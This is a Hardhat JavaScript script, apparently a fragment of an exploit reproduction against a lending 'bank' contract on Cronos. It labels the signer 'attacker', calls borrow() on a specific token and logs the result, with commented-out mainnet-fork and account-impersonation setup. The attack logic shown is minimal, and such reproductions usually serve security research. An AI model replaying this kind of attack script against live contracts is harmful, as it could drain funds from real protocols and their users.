const {network, ethers} = require("hardhat");
const hre = require("hardhat");


async function main() {
    /*
    await hre.network.provider.request({
        method: "hardhat_reset",
        params: [{
            forking: {
                jsonRpcUrl:"https://evm.cronos.org",
                blockNumber: 10679515
            }
        }]
    })
     */
    //
    /*
    const operatorAddress = "0xADd766b32E115fC1b680368887BC27E564C188A1";
    await hre.network.provider.request({
        method: "hardhat_impersonateAccount",
        params: [operatorAddress],
    });

     */

    // import vars
    const [attacker] = await ethers.getSigners();
    const attackerAddress = await attacker.getAddress();
    console.log("attacker address:", attackerAddress);


    // deplay the attack contract
    const bankAddress = "0x70f699f902628Af04dc5323C37CfA69e22140741"
    const bankContract = await ethers.getContractAt("IBank", bankAddress);
    console.log("bank contract address:", bankAddress);

    //
    // 执行
    //
    //const attackerBalanceBefore = await ethers.provider.getBalance(attackerAddress);
    //console.log("ETH Balance of Attacker (Before) = ", ethers.formatEther(attackerBalanceBefore));
    //
    const singleToken = "0x0804702a4e749d39a35fde73d1df0b1f1d6b8347"
    const amount = 10000
    const borrowTx = await bankContract.connect(attacker).borrow(singleToken, amount);
    console.log(`borrow tx hash: ${borrowTx.hash}`);

    const txReceipt = await borrowTx.wait();
    console.log("borrow tx receipt: ", txReceipt.logs);

    //
    //const attackerBalanceAfter = await ethers.provider.getBalance(attackerAddress);
    //console.log("ETH Balance of Attacker (After) = ", ethers.formatEther(attackerBalanceAfter));
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
